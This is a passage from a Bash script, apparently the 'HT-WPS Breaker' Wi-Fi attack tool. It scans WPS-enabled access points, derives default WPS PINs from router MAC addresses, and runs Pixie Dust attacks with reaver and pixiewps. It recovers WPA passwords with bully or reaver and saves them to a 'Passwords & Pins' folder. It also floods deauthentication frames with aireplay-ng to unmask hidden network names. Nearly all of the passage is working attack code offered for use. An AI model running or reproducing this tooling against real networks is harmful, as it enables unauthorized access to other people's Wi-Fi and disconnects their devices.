								   CHANNEL=`echo $line | awk -F' ' '{print $2}'`
								   POWER=`echo $line | awk -F' ' '{print $3}'`
								   WPS_VERSION=`echo $line | awk -F' ' '{print $4}'`
								   WPS_LOCKED=`echo $line | awk -F' ' '{print $5}'`
								   ESSID=`echo $line | cut -d' ' -f6-`
								   length=${#MAC}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
										Ver_vun=`echo $MAC | cut -c 1-8`
										if [ "$WPS_LOCKED" == "No" ]
										    then
											    WPS_LOCKED="  No  "
										else
										        WPS_LOCKED="Locked"
										fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
										CP=$(echo -e "$Vun_MAC_LIST" | grep -w "$Ver_vun")
										if [ "$CP" != "" ]
											then
												        v=1
										fi
									    Num_OF_PIN[$i]=0
									    Num_OF_MAC[$i]=0
									    CP=""
									    CP=$(echo -e "$Default_PIN_MAC_LIST" | grep "$Ver_vun" | awk -F"=" '{print $1}')
									    CP1=$(echo -e "$GENERATED_PIN_MAC_LIST" | grep "$Ver_vun")
									    if [ "$CP" != "" ]
											then
											     Num_OF_PIN[$i]=`echo $(($(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | wc -l)-$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)))-1))`
											     Num_OF_MAC[$i]=`echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p`
											     if [ "${Num_OF_PIN[$i]}" -ge "2" ]
											      	then
									    				for (( p=1; p<=${Num_OF_PIN[$i]}; p++))
									    					do
									    						declare PIN$(echo $MAC | tr -d ":")[$((p-1))]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(($p+1))+${Num_OF_MAC[$i]}))'p')
									    				done
									    		 else
									    				declare PIN$(echo $MAC | tr -d ":")[1]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)+2))'p')
									    		 fi
									    		 HHDP_GEN[$i]=0
									    		 HHDP[$i]=1
									    elif [ "$CP1" != "" ]
									    	then
									    		Num_OF_PIN[$i]="1"
									    		LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
												HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
												HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
												PIN=`expr 10 '*' $HALF_MAC`
												ACCUM=0                                                        
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
												THE_REST=`expr $ACCUM '%' 10`
												CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
												PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
									    		HHDP_GEN[$i]=1
									    		HHDP[$i]=1
									    else
									    		HHDP[$i]=0
									    fi
									    BLUE_MAC=0
									    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
											then
											    echo -e -n $BBlue"$MAC      "
											    BLUE_MAC=1
										elif [ "$WPS_LOCKED" == "Locked" ]
										    then
											    echo -e -n $BRed"$MAC      "
										elif [ "$v" == 1 ]
										    then
											    echo -e -n $BGreen"$MAC      "
										elif [ "${HHDP[$i]}" == "1" ]
											then
												echo -e -n $Purple"$MAC      "
									    else
								    		    echo -e -n $BYellow"$MAC      "
										fi
										if [ "$v" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ] || [ "${HHDP[$i]}" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ]
											then
												ti=$(($ti+1))
												Vun_BSSID[$ti]=$MAC
										    	Vun_CHANNEL[$ti]=$CHANNEL
										    	Vun_ESSID[$ti]=$ESSID
										    	Vun_PRIVACY[$ti]=$PRIVACY
										    	Vun_SPEED[$ti]=$SPEED
										    	Vun_Num_OF_PIN[$ti]=${Num_OF_PIN[$i]}
										    	Vun_PIN[$ti]=${PIN[$i]}
										    	Vun_HHDP[$ti]=${HHDP[$i]}
										    	Vun_HHDP_GEN[$ti]=${HHDP_GEN[$i]}
										fi
										if [ "$CHANNEL" -ge 10 ]
										    then
										        echo -e -n $BWhite"$CHANNEL\t"
										else
										        echo -e -n $BWhite"0$CHANNEL\t"
										fi
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$WPS_LOCKED" == "  No  " ]
										   then
										       echo -e -n $Green"  $WPS_LOCKED"
										else
										       echo -e -n $Red"  $WPS_LOCKED"
									    fi
										echo -e -n $Green"     $WPS_VERSION"
										echo -e $BWhite"    $ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            SPEED[$i]=$SPEED
		                            fi
									NL=$(($NL+1))
									fi
									sleep 0.1
									if [ "$fin" -eq 1 ]
									   then
									       count_rot=$(($count_rot+1))
									fi
									if [ "$count_rot" -eq "$num_wireless" ]
									    then
										    Quit=1
								    fi
								 done < <( cat ${Temporary}/wash_nf.txt 2> /dev/null )
						   num_wireless=$i
						   fin=1
						   trap exit_function SIGINT
						   echo ""
						   echo ""
						   SELECT_TO_CRACK
						   done
						   if [ "$back" == "1" ]
						        then
								    re="yes"
						   elif [ "$back" == "2" ]
						        then
								    re="no"
						   fi
                 fi
			     ;;
             "2")
			     Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
								   sleep 1
						   done
						   Ver_Dir=`ls ${Temporary} | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf ${Temporary}/capture
								mkdir ${Temporary}/capture
						   else
						        mkdir ${Temporary}/capture
     					   fi
     					   trap - SIGINT SIGQUIT SIGTSTP
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   SELECT_CAPTURE_CRACK
                 fi
                 ;;
			"3")
				  trap - SIGINT SIGQUIT SIGTSTP
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
                           Ver_Mon_Fun
						   echo -ne '\033c'
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White,GooD LucK"
								   sleep 1
						   done
						   echo "" > ${Temporary}/empty.txt
                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -P -s ${Temporary}/empty.txt
						   echo ""						   
					       echo -e -n "$Cyan [+]$Yellow PKE : $Green"
						   read PKE
						   echo -e -n "$Cyan [+]$Yellow PKR : $Green"
						   read PKR
						   echo -e -n "$Cyan [+]$Yellow E-Hash1 : $Green"
						   read E_Hash1
						   echo -e -n "$Cyan [+]$Yellow E-Hash2 : $Green"
						   read E_Hash2
						   echo -e -n "$Cyan [+]$Yellow AuthKey : $Green"
						   read AuthKey
						   echo -e -n "$Cyan [+]$Yellow E-Nonce : $Green"
						   read E_Nonce
                           echo -e -n "$Cyan [+]$Yellow R-Nonce : $Green"
						   read R_Nonce
						   if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
									      then
                                              trap kill_load SIGINT
                                              pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
                                              PID="$!"
                                              Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                              End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                                              Loading
                                              echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									          echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									          echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
											  #pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/${BSSID}.txt | head -n 11 | tail -n 9
									          PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
									          time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
											     if [ "$PIN" != "" ]
									                   then
									                   		echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
													        echo ""
									          				echo -e "${White}       [+] PIN  >>${Green} $PIN"
									          				echo -e "${White}       [+] Time taken >>${Red} $time_taken"
									          				echo ""
                                                            echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                                                            read PIN
													        hash bully 2> /dev/null
						                                    hash_bully="$?"
						   						            if [ $hash_bully -eq 0 ]
															     then
										                             echo ""
										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
										                             PID="$!"
										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
										                             Loading
										                             Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
													                 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
																 else
																     echo ""
																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
																	 echo ""
																	 reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
																	 PID="$!"
																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
																	 Loading
																	 Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
															fi
									              else
									                   echo ""
										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
												       echo ""
													   rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									              fi
						                 else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
				            fi
				    fi
				    ;;			
			"4")
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
                           Ver_Mon_Fun
						   echo -ne '\033c'
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow ESSID : $White"
						   read ESSID
						   echo ""
                           echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                           read PIN
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   hash bully
						   hash_bully="$?"
						   if [ $hash_bully -eq 0 ]
								then
									echo ""
									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
									echo ""
									bully -b $BSSID -c $CHANNEL -B -F -e "$ESSID" -p $PIN $mon
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
								else
									echo ""
									echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
									echo ""
									reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
							fi
						   
				fi
				;;
			  "5")
                 Ver_Pckg_Tools
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you see your target,good luck"
								   sleep 1
						   done
						   Ver_Dir=`ls /tmp/HT-WPS-Breaker | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf ${Temporary}/capture
								mkdir ${Temporary}/capture
						   else
						        mkdir ${Temporary}/capture
     					   fi
     					   trap - SIGINT SIGQUIT SIGTSTP
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   back=0
						   trap exit_function SIGINT
						   echo -ne '\033c'
					       echo -e "$Red+---------------------------------------------------------------------------------------+"
						   echo -e "| [+]$White If the BSSID in$BGreen green$White that means there are clients connected to device.$Red           |"
						   echo -e "| [+]$White If the BSSID in$BYellow yellow$White that means there are clients connected to device or aren't.$Red|"
						   echo -e "+---------------------------------------------------------------------------------------+$White"
						   echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						   echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						   i=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   v=0
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
										if [ "$CLIENT" == "Yes" ]
										    then
											    echo -e -n $BGreen"$MAC\t"
									        else
								    		    echo -e -n $BYellow"$MAC\t"
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                            fi
								 done < ${Temporary}/capture/capture-02.csv
						   echo ""
						   if [ "$i" -eq "0" ]
						   	   then
						   	       exit_function
						   fi
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [+]${Blue} Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
						                      read  N_OB
											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
											      then
											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
											  	        then
											                V_number=1
											         else
											                V_number=0
											         fi
											  else
											         V_number=0
											  fi
						   done
						   echo ""
						   trap - SIGINT SIGQUIT SIGTSTP
						   idlenght=${IDLENGTH[$N_OB]}
						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   BSSID=${BSSID[$N_OB]}
						   rm -rf ${Temporary}/capture/*
						   echo ""
						   echo -e "${White}  +${Yellow}------------------------------${White}+"
						   echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
						   echo -e "${White}  +${Yellow}------------------------------${White}+"
						   echo ""
						   trap kill_Hidden SIGINT
						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -c $CHANNEL -a $mon 2> /dev/null &
						   Airodump_PID=$!
						   disown $Airodump_PID
						   tset
						   aireplay-ng -0 0 -a $BSSID $mon > /dev/null 2> /dev/null &
						   aireplayID=$!
						   disown $aireplayID
						   Quit=0
						   while [ $Quit == 0 ]
								do
								  Hidden=`cat ${Temporary}/capture/capture-01.csv 2> /dev/null | grep ${BSSID} | cut -d',' -f14`
								  Ver_Name=`echo -e $Hidden`
								  if [ "$Ver_Name" != "" ]
								     then
								    	 echo ""
										 echo -en "\033[1A\033[2K"
                           		         echo -ne "${Yellow}          >>${White} The name has been obtained${Green} successfully ${White}."
                           		         Quit=1
                           		  else
                           		         echo -ne "\r${Yellow}          >>${White} The name of${Green} AP${White} is still {${Red} Hidden${White} } ."
                           		         Quit=0
                           		  fi
						   done
						   trap exit_function SIGINT
						   kill -9 $aireplayID 2> /dev/null
						   kill -9 $Airodump_PID 2> /dev/null
						   sleep 2.0
						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
						   SELECT_CAPTURE_CRACK
				fi
                  ;;
              "6")
                  for (( i = 0; i <= 9; i++ ))
                     do
                       sleep 0.2
                       echo -en "\033[1A\033[2K"
                  done
                  echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Enable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                  |"
                  sleep 0.2
                  echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Red Disable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                 |"
                  sleep 0.2
                  echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Back to menu ${White}.${White}                                             |"
                  sleep 0.2
                  echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
                  echo ""
                  echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
                  read ID
                  ID=`expr $ID + 0 2> /dev/null`
                  echo ""
                  case $ID in
                               "1")
                                   VerMon=""
                                   VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                                   Ver_Mon_WCar_Fun
                                   mode_monitor=no
                                   ;;
							   "2")
						           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						           if [ $cou_mon -ge 1 ]
						                then
								            Mode_Monitor_Print_Function
									        echo ""
									        echo ""
											V_number=0
									        while [ "$V_number" != "1" ]
									                do
											          echo -en "\033[1A\033[2K"
						                              echo -e -n "\r${White}[+] select$Red number$White of interface in order to${Red} Disable${White} it from [${Green}1-${NUM_INT_CHIP}$White]:$Green"
						                              read number
											          if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									                     then
											                 if [ $number -ge 1 ] && [ $number -le ${NUM_INT_CHIP} ]; then
											                     V_number=1
														         mon=${Interface[$number]}
											                 else
											                     V_number=0
											                 fi
											          else
											                     V_number=0
											          fi
								            done
											echo ""
											trap kill_load SIGINT
											ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
						                    PID="$!"
						                    Wait_Msg="Disabling${Cyan} Monitor Mode${White} on$Green $mon $White."
						                    End_Msg="${Cyan}Monitor Mode${White}$White is${Red} Disable ."
						                    Loading
						                    trap - SIGINT SIGQUIT SIGTSTP
											sleep 1
								   else
								            echo "" 
                            	            sleep 0.5
                            	            echo -e $White" [${Red}!${White}] Is no${Cyan} Monitor Mode${White} to${Red} Disable${White} ."
                            	            echo ""
                            	            sleep 0.5
						           fi
							       ;;
								"3")
								    re="yes"
								    ;;
								"*")
								    echo ""
			                        echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
			                        echo ""
								    ;;
                  esac
                  ;;
			  "7")
                  echo ""
                  echo -e "$White[${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X ."
                  echo ""
			      exit
			      ;;
			  *)
			   echo ""
			   echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
			   echo ""
			   ;;
esac
echo ""
echo -e "$White     [${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X ."
echo -e "\e[0;39m"
re=$(echo $re | tr [:upper:] [:lower:])
   while [ "$re" != 'y' ] && [ "$re" != 'yes' ] && [ "$re" != 'n' ] && [ "$re" != 'no' ] && [ "$re" != 'o' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
         do
           echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
           read re
           re=$(echo $re | tr [:upper:] [:lower:])
		   echo -en "\033[1A\033[2K"
		   echo -e "$DefaultColor"
	done

fi

done

#################################################
############The End of HT-WPS Breaker############
#################################################
				End_OF_THE_SCRIPT
#################################################